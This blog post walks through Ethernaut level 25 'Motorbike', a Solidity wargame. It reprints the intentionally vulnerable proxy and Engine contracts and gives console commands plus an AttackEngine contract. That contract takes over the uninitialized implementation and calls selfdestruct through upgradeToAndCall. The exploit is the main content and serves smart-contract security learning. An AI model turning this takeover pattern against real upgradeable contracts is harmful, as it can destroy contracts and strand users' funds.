---
layout: post
title: Ethernaut - 25. Motorbike
date:  2022-09-11
tags: ethernaut solidity
---

## Difficulty: 🌕🌕🌕🌑🌑
> Ethernaut's motorbike has a brand new upgradeable engine design.<br />
Would you be able to selfdestruct its engine and make the motorbike unusable ? <br />
Things that might help:
- [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)
- [UUPS upgradeable pattern](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786)
- [Initializable contract](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol)

## Contract
``` solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

## Writeup
1. Get new instance.
2. Call the method in the chrome console.

    ``` javascript

    implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
    implAddr = '0x' + implAddr.slice(-40)
    // Your Engine address

    ```
3. Convert an upper or lowercase Ethereum address to a checksum address.
    - [web3 document](https://web3js.readthedocs.io/en/v1.2.11/web3-utils.html#tochecksumaddress)
    - [EIP-55](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-55.md)

    ``` javascript

    await web3.utils.toChecksumAddress(implAddr)
    // Your Engine checksum address

    ```
4. Create a contract.
      ``` solidity
      // SPDX-License-Identifier: MIT
      pragma solidity <0.7.0;

      import "./Initializable.sol";
      import "./Address.sol";

      contract AttackEngine {
        bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

        address public upgrader;
        uint256 public horsePower;
        Engine public target = Engine(YOUR_ENGINE_CHECKSUM_ADDRESS);

        function attack() public {
            target.initialize();
            target.upgradeToAndCall(address(this), '0xb8b3dbc6');
        }

        fallback() external payable {
            selfdestruct(address(this));
        }
      }
      ```
    `Initialiazle.sol`
    ``` solidity
    // SPDX-License-Identifier: MIT
      pragma solidity >=0.4.24 <0.7.0;

      contract Initializable {

        bool private initialized;

        bool private initializing;

        modifier initializer() {
          require(initializing || isConstructor() || !initialized, "Contract instance has already been initialized");

          bool isTopLevelCall = !initializing;
          if (isTopLevelCall) {
            initializing = true;
            initialized = true;
          }

          _;

          if (isTopLevelCall) {
            initializing = false;
          }
        }

        function isConstructor() private view returns (bool) {
          address self = address(this);
          uint256 cs;
          assembly { cs := extcodesize(self) }
          return cs == 0;
        }

        uint256[50] private ______gap;
      }
    ```
    `Address.sol`
    ``` solidity
    // SPDX-License-Identifier: MIT

    pragma solidity ^0.6.2;

    library Address {
        
        function isContract(address account) internal view returns (bool) {
            uint256 size;
            assembly { size := extcodesize(account) }
            return size > 0;
        }

        function sendValue(address payable recipient, uint256 amount) internal {
            require(address(this).balance >= amount, "Address: insufficient balance");

            (bool success, ) = recipient.call{ value: amount }("");
            require(success, "Address: unable to send value, recipient may have reverted");
        }

        function functionCall(address target, bytes memory data) internal returns (bytes memory) {
          return functionCall(target, data, "Address: low-level call failed");
        }

        function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
            return _functionCallWithValue(target, data, 0, errorMessage);
        }

        function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
            return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
        }

        function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
            require(address(this).balance >= value, "Address: insufficient balance for call");
            return _functionCallWithValue(target, data, value, errorMessage);
        }

        function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
            require(isContract(target), "Address: call to non-contract");

            (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
            if (success) {
                return returndata;
            } else {
                if (returndata.length > 0) {
                    assembly {
                        let returndata_size := mload(returndata)
                        revert(add(32, returndata), returndata_size)
                    }
                } else {
                    revert(errorMessage);
                }
            }
        }
      }
    ```
5. Compile & Deploy `AttackEngine.sol`.
6. Call `attack` function.
7. Submit instance ξ( ✿＞◡❛)